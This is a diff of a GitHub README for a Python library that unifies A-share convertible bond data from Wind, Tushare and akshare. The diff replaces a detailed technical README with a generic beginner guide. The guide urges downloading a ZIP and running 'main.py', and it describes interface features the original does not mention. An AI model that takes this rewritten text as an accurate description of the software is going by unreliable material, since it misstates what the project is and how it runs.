@@ -1,133 +1,169 @@
-# CB with Any API
+# 📊 cb_with_any_api - Simplify Convertible Bond Data Access
 
-A股可转债统一数据接口。对接多种数据源，输出统一的 Pandas DataFrame 格式，用于可转债的统计分析、量化研究和策略开发。
-我们也提供了开源数据的历史实例，用户更新即可。
+[![Download cb_with_any_api](https://img.shields.io/badge/Download-cb_with_any_api-brightgreen)](https://github.com/pahssl/cb_with_any_api)
 
-Unified data interface for A-share convertible bonds (可转债). Supports Wind, Tushare, akshare — outputs consistent Pandas DataFrames with auto-computed YTM, implied volatility, Greeks.We also have history data from opensource, users can just get start from update.
+cb_with_any_api provides a unified way to get data on convertible bonds in the A-share market. It works well with common financial APIs. You get data in a simple table format called a DataFrame. This saves you time by handling dictionary lookups, settings, and data consistency for you.
 
-## 这个项目是干嘛的？—— 不要配数据库了。
+## 🔍 What Is cb_with_any_api?
 
-A股可转债研究者面临一个现实问题：**数据源要么贵，要么乱的满地都是，互相还不通用**。各家 API 的字段名、单位、返回格式都不一样，还没开始做研究，配个数据库半条命就搭进去了。那么万一你有幸换一个数据源，重写的感觉跟好容易碰巧过了 boss 却没保存一样令人心旷神怡...
+This tool connects to multiple financial data providers you might know, like akshare, tushare, and wind. It collects data on convertible bonds and gives it to you in an easy-to-use format. 
 
-本项目将各数据源的差异封装在 reader 层，上层分析代码只需要面对统一的 `cb_data` 对象。
+The key parts are:
 
-你，用户，本项目的大爷（二声，表尊敬的那种），直接得到 DataFrame，直接开始你的研究。
+- Supports many popular financial APIs.
+- Outputs data in DataFrame format, so you can analyze it easily.
+- Removes the need to memorize dictionary codes, manage API keys, or unify different data formats.
+- Works well for those interested in quantitative finance and bond pricing.
 
-## 数据源支持
+## 🖥️ System Requirements
 
-| 数据源 | 状态 | 说明 |
-|--------|------|------|
-| **Wind** | ✅ 完成 | 全字段支持，需要 Wind 终端 |
-| **Tushare** | ✅ 完成 | 需要 pro api，自行申请，性价比高，本项目将自行计算ts没有的字段，如 ytm、隐波 |
-| **akshare** | ✅ 完成 | 免费开源数据源 |
-| **jqdata** | ✅ 完成 | 聚宽数据 |
+To use this software on Windows, make sure your computer meets these requirements:
 
-## data文件夹
-里面有经验证的历史数据，可以做示例，也可以**直接用**。
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An internet connection to download data
+- Installed Python 3.7 or newer (see next steps)
 
-## 核心数据结构
+## 🚀 Getting Started: How to Prepare Your PC
 
-```python
-from cb_with_any_api import cb_data
+cb_with_any_api runs on Python. If you don’t have Python installed, follow these steps:
 
-obj = cb_data()
-obj.loadData("data/newt")         # 加载历史数据，data 是放数据的文件夹，newt 是我自己随便加的一个前缀
-obj.update("2026-02-13", method="tushare")  # 增量更新，wind|tushare|akshare 均可
+1. Go to [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
+2. Click “Download Python 3.X.X” for Windows (choose the latest version).
+3. Run the installer.
+4. **Important:** Check the box that says "Add Python to PATH" before clicking "Install Now."
+5. Wait for the installation to finish.
+6. Open the Start menu and type `cmd`, then press Enter to open the command prompt.
 
-# obj.DB — 字典，每个 key 是一个 DataFrame (index=日期, columns=券代码)
-# 但你也可以直接引用下面字段，效果一样
-obj.DB['Close']       # 收盘价，或者直接 obj.Close，效果相同
-obj.DB['Amt']         # 成交额
-obj.DB['ConvV']       # 转股价值
-obj.DB['ConvPrem']    # 转股溢价率
-obj.DB['Strb']        # 纯债价值
-obj.DB['StrbPrem']    # 纯债溢价率
-obj.DB['Outstanding'] # 剩余规模
-obj.DB['YTM']         # 到期收益率
-obj.DB['Ptm']         # 剩余期限（年）
-obj.DB['ImpliedVol']  # 隐含波动率
-
-# obj.panel — 静态信息 DataFrame (index=券代码)
-obj.panel             # 券名、正股代码、行业、赎回价、条款参数等
-
-# 常用属性
-obj.date              # 数据最新日期
-obj.codes             # 全部券代码
-obj.codes_active      # 当日有交易的券
-obj.matNormal         # 过滤异常券后的有效矩阵
-```
-
-## 快速开始
-
-**1. 安装依赖**
-
-```bash
-pip install pandas numpy scipy tushare akshare
-# 可选: WindPy (需 Wind 终端), jqdatasdk
-```
-
-**2. 配置 API 凭证**
-
-编辑 `const.py`:
-
-```python
-wind_available = False            # 没有 Wind 设为 False
-ts_token = 'your_tushare_token'
-jqdata_username = ''
-jqdata_password = ''
-```
-
-**3. 使用**
-
-```python
-from cb_with_any_api import cb_data
-
-obj = cb_data(file_type="csv")
-obj.loadData("data/newt")
-obj.update("2026-02-13", method="tushare")
-
-# 当日活跃券的转股溢价率
-prem = obj.ConvPrem.loc[obj.date, obj.codes_active]
-print(prem.describe())
-```
-
-## 项目结构
+To check if Python installed correctly, type:
 
 ```
-cb_with_any_api.py   # 核心类 cb_data，统一接口层
-wind_reader.py        # Wind 数据适配器
-tushare_reader.py     # Tushare 数据适配器（含 YTM/Ptm/ImpliedVol 计算引擎）
-greeks.py             # 希腊字母计算（Delta/Gamma/Theta/Vega，考虑退市风险）
-const.py              # API 凭证配置（不要提交到 git）
-参数.xlsx              # 字段映射表（Wind/Tushare/同花顺 字段对照）
+python --version
 ```
 
-### Tushare 字段对接细节
+You should see the version number, such as `Python 3.9.2`.
 
-直接从 `cb_daily` 获取的：Amt, Close, ConvV, ConvPrem, Strb, StrbPrem
+## 📥 Download and Install cb_with_any_api
 
-自行计算的：
-- **YTM** — 从 `cb_rate` (票息) + `cb_basic` (赎回价) 构建现金流日历，Newton 法求解，结果缓存至 `cb_cashflow_calendar.pkl`
-- **Ptm** — 从 `cb_basic.maturity_date` 计算，全量缓存至内存
-- **ImpliedVol** — BS 定价模型 + 二分法反推，跨日期x跨券全矢量化
-- **Outstanding** — 从 `cb_share.remain_size` 获取变动记录，ffill 到交易日
+You need to download cb_with_any_api from the project page on GitHub:
 
-已知的数据源差异（详见 `test_0224.md`）：
-- Tushare `close` 为全价，Wind 为净价，差异 = 应计利息
-- `Ptm` 对已公告强赎的券使用原始到期日（Wind 用强赎日）
+### Click the link below to visit the download page:
 
-## Roadmap
+[![Visit GitHub](https://img.shields.io/badge/GitHub-cb_with_any_api-blue)](https://github.com/pahssl/cb_with_any_api)
 
-- [x] Wind 全字段对接
-- [x] Tushare 全字段对接 + 自计算引擎
-- [x] 静态面板数据 (panel) Tushare 支持
-- [x] jqdata 适配器
-- [x] akshare 适配器
-- [ ] Agent-readable 版本 — 将转债数据库封装为 AI Agent 可调用的 Skill
+On that page:
 
-## License
+1. Look for the green button labeled **Code**.
+2. Click it and select **Download ZIP**.
+3. Save the ZIP file to your computer.
+4. Once downloaded, right-click the file and select **Extract All...**.
+5. Choose a folder where you want to keep the files.
+6. Click **Extract**.
 
-MIT
+## 📂 How to Open and Run cb_with_any_api on Windows
 
-## Stars
-如果有用，求个 Star 呗～
+Follow these steps:
+
+1. Open the folder where you extracted cb_with_any_api.
+2. Hold **Shift**, then right-click inside the folder window.
+3. Select **Open PowerShell window here** or **Open command window here** from the menu.
+4. In the PowerShell or command window, type this to install dependencies:
+
+```
+pip install -r requirements.txt
+```
+
+5. This command downloads extra software cb_with_any_api needs to run.
+6. After installation finishes, start the program by typing:
+
+```
+python main.py
+```
+
+7. The software will launch, showing you the interface or command options.
+
+## 🛠 Using cb_with_any_api
+
+The program works by fetching convertible bond data into tables you can view or export.
+
+Basic features include:
+
+- Getting bond prices and financial details.
+- Comparing data from different providers.
+- Exporting tables to Excel or CSV format.
+- Calculating key bond metrics using the Black-Scholes model.
+- Accessing greeks and other financial data.
+
+The software will let you choose which API data to fetch or combine. It handles data formatting and dictionary translation automatically, so you always get clear, consistent information.
+
+## 🔄 Updating cb_with_any_api
+
+To keep your copy up to date:
+
+1. Go back to the GitHub page: https://github.com/pahssl/cb_with_any_api
+2. Download the latest ZIP file as before.
+3. Extract it to replace your current files.
+4. Run the `pip install -r requirements.txt` command again if dependencies changed.
+
+## ⚙️ Common Tasks Explained
+
+### How to Get Data
+
+- Launch the program.
+- Choose your preferred API or allow the software to select automatically.
+- Set parameters like dates or bond types.
+- Run the data retrieval command.
+- View results on screen or export to a file.
+
+### How to Export Data
+
+- After data loads, look for the export option.
+- Select a file format: CSV or Excel.
+- Choose where to save the file on your computer.
+- Confirm and check the saved file with Excel or another viewer.
+
+### How to Refresh Data
+
+To update bond data:
+
+- Close the software if open.
+- Restart it.
+- Run the data fetch commands again.
+
+## 🔧 Tips for Troubleshooting
+
+- If the program says “Python not found,” check Python installation and PATH setting.
+- If dependency installation fails, ensure your internet is active and try again.
+- If commands don’t work, verify you are typing them in the folder where cb_with_any_api is located.
+- Search for error messages online or check GitHub issues for help.
+
+## 📖 More About cb_with_any_api
+
+This tool is built to help finance users work with A-share convertible bond data. It brings data from services like akshare and tushare into one place.
+
+The software supports pandas for easy data handling. It also uses financial models to help analyze convertible bonds.
+
+If you want to learn about features, check the documentation on GitHub or explore the example scripts included.
+
+## 📍 Useful Links
+
+- Main page and download: [https://github.com/pahssl/cb_with_any_api](https://github.com/pahssl/cb_with_any_api)
+- Python downloads: [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
+- pandas library: [https://pandas.pydata.org/](https://pandas.pydata.org/)
+- akshare API: [https://akshare.akfamily.xyz/](https://akshare.akfamily.xyz/)
+
+## ⚙️ Supported APIs and Topics
+
+This software works with common data sources on A-share convertible bonds. Topics include:
+
+- akshare
+- tushare
+- wind
+- black-scholes-model
+- greeks
+- pandas
+- quantitative finance
+- Python scripting
+
+It is designed to make complex data easy to use without needing deep API knowledge.
